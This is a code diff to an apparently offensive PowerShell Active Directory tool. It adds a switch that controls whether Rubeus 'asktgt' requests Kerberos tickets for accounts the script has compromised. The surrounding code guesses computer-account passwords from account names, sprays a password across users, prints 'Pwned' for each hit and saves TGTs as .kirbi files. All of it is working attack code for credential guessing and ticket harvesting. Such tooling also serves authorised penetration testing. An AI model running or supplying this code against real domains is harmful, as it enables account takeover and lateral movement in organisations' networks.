@@ -99,6 +99,8 @@ param(
   [switch]$TestCA,
   [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [string]$Rubeus,
+  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
+  [switch]$Asktgt,
   [Parameter(Mandatory=$false)]
   [string]$Certify,
   [Parameter(ParameterSetName='ldap',Mandatory=$false)]
@@ -160,7 +162,10 @@ Function Test-Computers {
     $pass = $_.Replace("`$","").ToLower()
 
       if ($valid) {
-        Load-Rubeus -command "asktgt /user:$_ /password:$pass /outfile:$_.kirbi"
+        if ($Asktgt) {
+          Load-Rubeus -command "asktgt /user:$_ /password:$pass /outfile:$_.kirbi /nowrap"
+        }
+        
         write-host Pwned computer: $_ using password: $_.Replace("`$","").ToLower() -ForegroundColor Cyan
       } else {
           $valid = Test-ADAuthentication -username $_ -password ""
@@ -199,7 +204,10 @@ Function Test-Users {
           
           if ($valid) {
             write-host Pwned user: $_ using password: $Spraypass -ForegroundColor Cyan
-            Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /outfile:$_.kirbi"
+              if ($Asktgt) {
+                Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /outfile:$_.kirbi /nowrap"
+              }
+            
           } 
 
         } 
